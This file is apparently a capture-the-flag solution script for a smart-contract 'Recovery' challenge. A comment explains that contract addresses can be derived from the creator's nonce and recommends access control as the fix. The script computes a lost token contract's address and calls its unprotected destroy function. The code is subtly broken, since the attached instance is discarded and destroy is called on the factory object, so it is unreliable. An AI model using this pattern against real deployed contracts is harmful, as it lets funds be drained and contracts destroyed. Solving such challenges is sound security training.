/**

Recovery
 
Vulnerability:
Address of a contract created by a contract can be easily computed by keccak256(sender, nonse)
and public functions with no access control can be invoked by anyone

Preventative Techniques:
Always protect sensitive public functions with access control

*/

const { ethers } = require('hardhat')
const { getContractAddress } = require('@ethersproject/address')

const attack = async (factoryAddress) => {

  const tokenAddress = getContractAddress({
    from: factoryAddress,
    nonce: 0
  });

  const Token = await ethers.getContractFactory("Token");

  Token.attach(tokenAddress);

  await (await Token.destroy()).wait();
}